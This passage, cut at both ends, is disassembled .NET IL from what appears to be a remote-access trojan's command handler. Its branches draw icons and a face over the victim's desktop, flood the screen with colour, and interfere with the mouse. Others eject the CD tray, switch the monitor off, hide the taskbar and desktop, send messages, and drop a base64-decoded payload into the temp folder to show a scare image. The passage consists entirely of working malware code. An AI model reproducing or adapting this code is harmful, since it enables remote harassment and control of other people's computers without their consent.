      IL_11c7:  ldc.i4.6
      IL_11c8:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_11cd:  stloc.s    V_78
      IL_11cf:  ldloc.s    V_78
      IL_11d1:  switch     ( 
                            IL_11f0,
                            IL_11f9,
                            IL_1202,
                            IL_120b,
                            IL_1214,
                            IL_121d)
      IL_11ee:  br.s       IL_1224

      IL_11f0:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Error()
      IL_11f5:  stloc.s    V_73
      IL_11f7:  br.s       IL_1224

      IL_11f9:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Warning()
      IL_11fe:  stloc.s    V_73
      IL_1200:  br.s       IL_1224

      IL_1202:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Information()
      IL_1207:  stloc.s    V_73
      IL_1209:  br.s       IL_1224

      IL_120b:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_WinLogo()
      IL_1210:  stloc.s    V_73
      IL_1212:  br.s       IL_1224

      IL_1214:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Shield()
      IL_1219:  stloc.s    V_73
      IL_121b:  br.s       IL_1224

      IL_121d:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Application()
      IL_1222:  stloc.s    V_73
      IL_1224:  ldloc.s    V_73
      IL_1226:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Width()
      IL_122b:  stloc.s    V_74
      IL_122d:  ldloc.s    V_73
      IL_122f:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Height()
      IL_1234:  stloc.s    V_75
      IL_1236:  ldloc.s    V_71
      IL_1238:  ldloc.s    V_69
      IL_123a:  ldloc.s    V_74
      IL_123c:  sub.ovf
      IL_123d:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1242:  stloc.s    V_76
      IL_1244:  ldloc.s    V_71
      IL_1246:  ldloc.s    V_70
      IL_1248:  ldloc.s    V_75
      IL_124a:  sub.ovf
      IL_124b:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1250:  stloc.s    V_77
      IL_1252:  ldloc.s    V_68
      IL_1254:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_1259:  dup
      IL_125a:  ldloc.s    V_73
      IL_125c:  ldloc.s    V_76
      IL_125e:  ldloc.s    V_77
      IL_1260:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawIcon(class [System.Drawing]System.Drawing.Icon,
                                                                                           int32,
                                                                                           int32)
      IL_1265:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_126a:  ldloc.s    V_72
      IL_126c:  ldc.i4.1
      IL_126d:  add.ovf
      IL_126e:  stloc.s    V_72
      IL_1270:  ldloc.s    V_72
      IL_1272:  ldc.i4.s   10
      IL_1274:  ble        IL_11c5

      IL_1279:  ldloc.s    V_67
      IL_127b:  ldloc.s    V_68
      IL_127d:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_1282:  pop
      IL_1283:  br         IL_1b0b

      IL_1288:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
      IL_128d:  call       native int j.OK::GetDesktopWindow()
      IL_1292:  stloc.s    V_79
      IL_1294:  ldloc.s    V_79
      IL_1296:  call       native int j.OK::GetWindowDC(native int)
      IL_129b:  stloc.s    V_80
      IL_129d:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_12a2:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_12a7:  stloc.s    V_81
      IL_12a9:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Yellow()
      IL_12ae:  stloc.s    V_82
      IL_12b0:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
      IL_12b5:  stloc.s    V_83
      IL_12b7:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Red()
      IL_12bc:  stloc.s    V_84
      IL_12be:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
      IL_12c3:  stloc.s    V_85
      IL_12c5:  ldloc.s    V_82
      IL_12c7:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_12cc:  stloc.s    V_86
      IL_12ce:  ldc.i4.s   100
      IL_12d0:  stloc.s    V_87
      IL_12d2:  ldc.i4.s   100
      IL_12d4:  stloc.s    V_88
      IL_12d6:  call       float32 [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Rnd()
      IL_12db:  ldloca.s   V_81
      IL_12dd:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_12e2:  ldloc.s    V_87
      IL_12e4:  sub.ovf
      IL_12e5:  conv.r4
      IL_12e6:  mul
      IL_12e7:  conv.r8
      IL_12e8:  call       float64 [mscorlib]System.Math::Floor(float64)
      IL_12ed:  conv.ovf.i4
      IL_12ee:  stloc.s    V_89
      IL_12f0:  call       float32 [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Rnd()
      IL_12f5:  ldloca.s   V_81
      IL_12f7:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_12fc:  ldloc.s    V_88
      IL_12fe:  sub.ovf
      IL_12ff:  conv.r4
      IL_1300:  mul
      IL_1301:  conv.r8
      IL_1302:  call       float64 [mscorlib]System.Math::Floor(float64)
      IL_1307:  conv.ovf.i4
      IL_1308:  stloc.s    V_90
      IL_130a:  ldloc.s    V_89
      IL_130c:  ldloc.s    V_90
      IL_130e:  ldloc.s    V_87
      IL_1310:  ldloc.s    V_88
      IL_1312:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_1317:  stloc.s    V_91
      IL_1319:  ldloc.s    V_80
      IL_131b:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_1320:  dup
      IL_1321:  ldloc.s    V_86
      IL_1323:  ldloc.s    V_91
      IL_1325:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_132a:  ldloc.s    V_83
      IL_132c:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_1331:  stloc.s    V_92
      IL_1333:  ldc.i4.s   20
      IL_1335:  stloc.s    V_93
      IL_1337:  ldc.i4.s   20
      IL_1339:  stloc.s    V_94
      IL_133b:  ldloc.s    V_89
      IL_133d:  ldc.i4.s   10
      IL_133f:  add.ovf
      IL_1340:  stloc.s    V_95
      IL_1342:  ldloc.s    V_90
      IL_1344:  ldc.i4.s   20
      IL_1346:  add.ovf
      IL_1347:  stloc.s    V_96
      IL_1349:  ldloc.s    V_89
      IL_134b:  ldloc.s    V_87
      IL_134d:  add.ovf
      IL_134e:  ldc.i4.s   30
      IL_1350:  sub.ovf
      IL_1351:  stloc.s    V_97
      IL_1353:  ldloc.s    V_90
      IL_1355:  ldc.i4.s   20
      IL_1357:  add.ovf
      IL_1358:  stloc.s    V_98
      IL_135a:  ldloc.s    V_95
      IL_135c:  ldloc.s    V_96
      IL_135e:  ldloc.s    V_93
      IL_1360:  ldloc.s    V_94
      IL_1362:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_1367:  stloc.s    V_99
      IL_1369:  ldloc.s    V_97
      IL_136b:  ldloc.s    V_98
      IL_136d:  ldloc.s    V_93
      IL_136f:  ldloc.s    V_94
      IL_1371:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_1376:  stloc.s    V_100
      IL_1378:  dup
      IL_1379:  ldloc.s    V_92
      IL_137b:  ldloc.s    V_99
      IL_137d:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_1382:  dup
      IL_1383:  ldloc.s    V_92
      IL_1385:  ldloc.s    V_100
      IL_1387:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_138c:  ldloc.s    V_84
      IL_138e:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_1393:  stloc.s    V_101
      IL_1395:  ldc.i4.s   10
      IL_1397:  stloc.s    V_102
      IL_1399:  ldc.i4.s   10
      IL_139b:  stloc.s    V_103
      IL_139d:  ldloc.s    V_95
      IL_139f:  ldc.i4.3
      IL_13a0:  add.ovf
      IL_13a1:  stloc.s    V_104
      IL_13a3:  ldloc.s    V_96
      IL_13a5:  ldc.i4.5
      IL_13a6:  add.ovf
      IL_13a7:  stloc.s    V_105
      IL_13a9:  ldloc.s    V_97
      IL_13ab:  ldc.i4.3
      IL_13ac:  add.ovf
      IL_13ad:  stloc.s    V_106
      IL_13af:  ldloc.s    V_98
      IL_13b1:  ldc.i4.5
      IL_13b2:  add.ovf
      IL_13b3:  stloc.s    V_107
      IL_13b5:  ldloc.s    V_104
      IL_13b7:  ldloc.s    V_105
      IL_13b9:  ldloc.s    V_102
      IL_13bb:  ldloc.s    V_103
      IL_13bd:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_13c2:  stloc.s    V_108
      IL_13c4:  ldloc.s    V_106
      IL_13c6:  ldloc.s    V_107
      IL_13c8:  ldloc.s    V_102
      IL_13ca:  ldloc.s    V_103
      IL_13cc:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_13d1:  stloc.s    V_109
      IL_13d3:  dup
      IL_13d4:  ldloc.s    V_101
      IL_13d6:  ldloc.s    V_108
      IL_13d8:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_13dd:  dup
      IL_13de:  ldloc.s    V_101
      IL_13e0:  ldloc.s    V_109
      IL_13e2:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_13e7:  ldloc.s    V_85
      IL_13e9:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_13ee:  stloc.s    V_110
      IL_13f0:  ldc.i4.s   40
      IL_13f2:  stloc.s    V_111
      IL_13f4:  ldc.i4.s   20
      IL_13f6:  stloc.s    V_112
      IL_13f8:  ldloc.s    V_89
      IL_13fa:  ldc.i4.s   30
      IL_13fc:  add.ovf
      IL_13fd:  stloc.s    V_113
      IL_13ff:  ldloc.s    V_90
      IL_1401:  ldc.i4.s   60
      IL_1403:  add.ovf
      IL_1404:  stloc.s    V_114
      IL_1406:  newobj     instance void [System.Drawing]System.Drawing.Drawing2D.GraphicsPath::.ctor()
      IL_140b:  stloc.s    V_115
      IL_140d:  ldloc.s    V_115
      IL_140f:  ldloc.s    V_113
      IL_1411:  ldloc.s    V_114
      IL_1413:  ldloc.s    V_111
      IL_1415:  ldloc.s    V_112
      IL_1417:  ldc.r4     180.
      IL_141c:  ldc.r4     180.
      IL_1421:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.GraphicsPath::AddArc(int32,
                                                                                                       int32,
                                                                                                       int32,
                                                                                                       int32,
                                                                                                       float32,
                                                                                                       float32)
      IL_1426:  dup
      IL_1427:  ldloc.s    V_110
      IL_1429:  ldloc.s    V_115
      IL_142b:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillPath(class [System.Drawing]System.Drawing.Brush,
                                                                                           class [System.Drawing]System.Drawing.Drawing2D.GraphicsPath)
      IL_1430:  ldloc.s    V_86
      IL_1432:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1437:  ldloc.s    V_92
      IL_1439:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_143e:  ldloc.s    V_101
      IL_1440:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1445:  ldloc.s    V_110
      IL_1447:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_144c:  dup
      IL_144d:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_1452:  ldloc.s    V_79
      IL_1454:  ldloc.s    V_80
      IL_1456:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_145b:  pop
      IL_145c:  ldloc.s    V_86
      IL_145e:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1463:  ldloc.s    V_92
      IL_1465:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_146a:  ldloc.s    V_101
      IL_146c:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1471:  ldloc.s    V_110
      IL_1473:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1478:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_147d:  ldloc.s    V_79
      IL_147f:  ldloc.s    V_80
      IL_1481:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_1486:  pop
      IL_1487:  br         IL_1b0b

      IL_148c:  call       native int j.OK::GetDesktopWindow()
      IL_1491:  stloc.s    V_116
      IL_1493:  ldloc.s    V_116
      IL_1495:  call       native int j.OK::GetWindowDC(native int)
      IL_149a:  stloc.s    V_117
      IL_149c:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_14a1:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_14a6:  stloc.s    V_19
      IL_14a8:  ldloca.s   V_19
      IL_14aa:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_14af:  stloc.s    V_118
      IL_14b1:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_14b6:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_14bb:  stloc.s    V_19
      IL_14bd:  ldloca.s   V_19
      IL_14bf:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_14c4:  stloc.s    V_119
      IL_14c6:  ldc.i4.7
      IL_14c7:  newarr     [System.Drawing]System.Drawing.Color
      IL_14cc:  dup
      IL_14cd:  ldc.i4.0
      IL_14ce:  ldc.i4     0x80
      IL_14d3:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Red()
      IL_14d8:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_14dd:  stelem     [System.Drawing]System.Drawing.Color
      IL_14e2:  dup
      IL_14e3:  ldc.i4.1
      IL_14e4:  ldc.i4     0x80
      IL_14e9:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Orange()
      IL_14ee:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_14f3:  stelem     [System.Drawing]System.Drawing.Color
      IL_14f8:  dup
      IL_14f9:  ldc.i4.2
      IL_14fa:  ldc.i4     0x80
      IL_14ff:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Yellow()
      IL_1504:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_1509:  stelem     [System.Drawing]System.Drawing.Color
      IL_150e:  dup
      IL_150f:  ldc.i4.3
      IL_1510:  ldc.i4     0x80
      IL_1515:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Green()
      IL_151a:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_151f:  stelem     [System.Drawing]System.Drawing.Color
      IL_1524:  dup
      IL_1525:  ldc.i4.4
      IL_1526:  ldc.i4     0x80
      IL_152b:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Blue()
      IL_1530:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_1535:  stelem     [System.Drawing]System.Drawing.Color
      IL_153a:  dup
      IL_153b:  ldc.i4.5
      IL_153c:  ldc.i4     0x80
      IL_1541:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Indigo()
      IL_1546:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_154b:  stelem     [System.Drawing]System.Drawing.Color
      IL_1550:  dup
      IL_1551:  ldc.i4.6
      IL_1552:  ldc.i4     0x80
      IL_1557:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Violet()
      IL_155c:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_1561:  stelem     [System.Drawing]System.Drawing.Color
      IL_1566:  stloc.s    V_120
      IL_1568:  ldc.i4.0
      IL_1569:  ldc.i4.0
      IL_156a:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_156f:  ldloc.s    V_118
      IL_1571:  ldloc.s    V_119
      IL_1573:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_1578:  ldloc.s    V_120
      IL_157a:  ldc.i4.0
      IL_157b:  ldelem     [System.Drawing]System.Drawing.Color
      IL_1580:  ldloc.s    V_120
      IL_1582:  ldloc.s    V_120
      IL_1584:  ldlen
      IL_1585:  conv.i4
      IL_1586:  ldc.i4.1
      IL_1587:  sub.ovf
      IL_1588:  ldelem     [System.Drawing]System.Drawing.Color
      IL_158d:  newobj     instance void [System.Drawing]System.Drawing.Drawing2D.LinearGradientBrush::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                                             valuetype [System.Drawing]System.Drawing.Color,
                                                                                                             valuetype [System.Drawing]System.Drawing.Color)
      IL_1592:  stloc.s    V_121
      IL_1594:  newobj     instance void [System.Drawing]System.Drawing.Drawing2D.ColorBlend::.ctor()
      IL_1599:  stloc.s    V_122
      IL_159b:  ldloc.s    V_122
      IL_159d:  ldloc.s    V_120
      IL_159f:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.ColorBlend::set_Colors(valuetype [System.Drawing]System.Drawing.Color[])
      IL_15a4:  ldloc.s    V_120
      IL_15a6:  ldlen
      IL_15a7:  conv.i4
      IL_15a8:  ldc.i4.1
      IL_15a9:  sub.ovf
      IL_15aa:  ldc.i4.1
      IL_15ab:  add.ovf
      IL_15ac:  newarr     [mscorlib]System.Single
      IL_15b1:  stloc.s    V_123
      IL_15b3:  ldloc.s    V_120
      IL_15b5:  ldlen
      IL_15b6:  conv.i4
      IL_15b7:  ldc.i4.1
      IL_15b8:  sub.ovf
      IL_15b9:  stloc.s    V_124
      IL_15bb:  ldc.i4.0
      IL_15bc:  stloc.s    V_125
      IL_15be:  br.s       IL_15d6

      IL_15c0:  ldloc.s    V_123
      IL_15c2:  ldloc.s    V_125
      IL_15c4:  ldloc.s    V_125
      IL_15c6:  conv.r4
      IL_15c7:  ldloc.s    V_120
      IL_15c9:  ldlen
      IL_15ca:  conv.i4
      IL_15cb:  ldc.i4.1
      IL_15cc:  sub.ovf
      IL_15cd:  conv.r4
      IL_15ce:  div
      IL_15cf:  stelem.r4
      IL_15d0:  ldloc.s    V_125
      IL_15d2:  ldc.i4.1
      IL_15d3:  add.ovf
      IL_15d4:  stloc.s    V_125
      IL_15d6:  ldloc.s    V_125
      IL_15d8:  ldloc.s    V_124
      IL_15da:  ble.s      IL_15c0

      IL_15dc:  ldloc.s    V_122
      IL_15de:  ldloc.s    V_123
      IL_15e0:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.ColorBlend::set_Positions(float32[])
      IL_15e5:  ldloc.s    V_121
      IL_15e7:  ldloc.s    V_122
      IL_15e9:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.LinearGradientBrush::set_InterpolationColors(class [System.Drawing]System.Drawing.Drawing2D.ColorBlend)
      IL_15ee:  ldloc.s    V_117
      IL_15f0:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_15f5:  dup
      IL_15f6:  ldloc.s    V_121
      IL_15f8:  ldc.i4.0
      IL_15f9:  ldc.i4.0
      IL_15fa:  ldloc.s    V_118
      IL_15fc:  ldloc.s    V_119
      IL_15fe:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillRectangle(class [System.Drawing]System.Drawing.Brush,
                                                                                                int32,
                                                                                                int32,
                                                                                                int32,
                                                                                                int32)
      IL_1603:  ldloc.s    V_121
      IL_1605:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_160a:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_160f:  ldloc.s    V_116
      IL_1611:  ldloc.s    V_117
      IL_1613:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_1618:  pop
      IL_1619:  br         IL_1b0b

      IL_161e:  ldnull
      IL_161f:  ldftn      void j.OK::Mouse()
      IL_1625:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_162a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_162f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_1634:  br         IL_1b0b

      IL_1639:  ldstr      "set CDAudio door open"
      IL_163e:  ldnull
      IL_163f:  ldc.i4.0
      IL_1640:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_1645:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_164a:  pop
      IL_164b:  br         IL_1b0b

      IL_1650:  ldstr      "set CDAudio door closed"
      IL_1655:  ldnull
      IL_1656:  ldc.i4.0
      IL_1657:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_165c:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_1661:  pop
      IL_1662:  br         IL_1b0b

      IL_1667:  ldc.i4.m1
      IL_1668:  ldc.i4     0x112
      IL_166d:  ldc.i4     0xf170
      IL_1672:  ldc.i4.m1
      IL_1673:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_1678:  br         IL_1b0b

      IL_167d:  ldc.i4.m1
      IL_167e:  ldc.i4     0x112
      IL_1683:  ldc.i4     0xf170
      IL_1688:  ldc.i4.2
      IL_1689:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_168e:  br         IL_1b0b

      IL_1693:  ldstr      "Shell_TrayWnd"
      IL_1698:  ldnull
      IL_1699:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_169e:  ldc.i4.0
      IL_169f:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_16a4:  pop
      IL_16a5:  leave      IL_26c9

      IL_16aa:  ldstr      "Shell_TrayWnd"
      IL_16af:  ldnull
      IL_16b0:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_16b5:  ldc.i4.4
      IL_16b6:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_16bb:  pop
      IL_16bc:  leave      IL_26c9

      IL_16c1:  ldstr      "Progman"
      IL_16c6:  ldnull
      IL_16c7:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_16cc:  ldc.i4.0
      IL_16cd:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_16d2:  pop
      IL_16d3:  leave      IL_26c9

      IL_16d8:  ldstr      "Progman"
      IL_16dd:  ldnull
      IL_16de:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_16e3:  ldc.i4.4
      IL_16e4:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_16e9:  pop
      IL_16ea:  leave      IL_26c9

      IL_16ef:  ldstr      "ChamaFrmTerrorrr"
      IL_16f4:  call       bool j.OK::Send(string)
      IL_16f9:  pop
      IL_16fa:  leave      IL_26c9

      IL_16ff:  ldstr      "off"
      IL_1704:  stsfld     string j.OK::SCREAM
      .try
      {
        IL_1709:  ldnull
        IL_170a:  stloc.s    V_126
        IL_170c:  ldloc.3
        IL_170d:  ldc.i4.2
        IL_170e:  ldelem.ref
        IL_170f:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_1714:  ldc.i4.0
        IL_1715:  stloc.s    V_128
        IL_1717:  ldloca.s   V_128
        IL_1719:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_171e:  stloc.s    V_126
        IL_1720:  ldstr      "temp"
        IL_1725:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_172a:  ldstr      "\\"
        IL_172f:  ldc.i4.s   10
        IL_1731:  call       string j.OK::RN(int32)
        IL_1736:  ldloc.3
        IL_1737:  ldc.i4.1
        IL_1738:  ldelem.ref
        IL_1739:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_173e:  stloc.s    V_127
        IL_1740:  ldloc.s    V_127
        IL_1742:  ldloc.s    V_126
        IL_1744:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1749:  newobj     instance void frmSustos::.ctor()
        IL_174e:  dup
        IL_174f:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
        IL_1754:  ldloc.s    V_127
        IL_1756:  call       class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::FromFile(string)
        IL_175b:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_Image(class [System.Drawing]System.Drawing.Image)
        IL_1760:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_1765:  leave.s    IL_1776

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1767:  dup
        IL_1768:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_176d:  stloc.s    V_129
        IL_176f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1774:  leave.s    IL_1776

      }  // end handler
      IL_1776:  leave      IL_26c9

      IL_177b:  ldstr      "on"
      IL_1780:  stsfld     string j.OK::SCREAM
      .try
      {
        IL_1785:  ldnull
        IL_1786:  stloc.s    V_130
        IL_1788:  ldloc.3
        IL_1789:  ldc.i4.2
        IL_178a:  ldelem.ref
        IL_178b:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_1790:  ldc.i4.0
        IL_1791:  stloc.s    V_128
        IL_1793:  ldloca.s   V_128
        IL_1795:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_179a:  stloc.s    V_130
        IL_179c:  ldstr      "temp"
        IL_17a1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_17a6:  ldstr      "\\"
        IL_17ab:  ldc.i4.s   10
        IL_17ad:  call       string j.OK::RN(int32)
        IL_17b2:  ldloc.3
        IL_17b3:  ldc.i4.1
        IL_17b4:  ldelem.ref
        IL_17b5:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_17ba:  stloc.s    V_131
        IL_17bc:  ldloc.s    V_131
        IL_17be:  ldloc.s    V_130
        IL_17c0:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_17c5:  newobj     instance void frmSustos::.ctor()
        IL_17ca:  dup
        IL_17cb:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
        IL_17d0:  ldloc.s    V_131
        IL_17d2:  call       class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::FromFile(string)
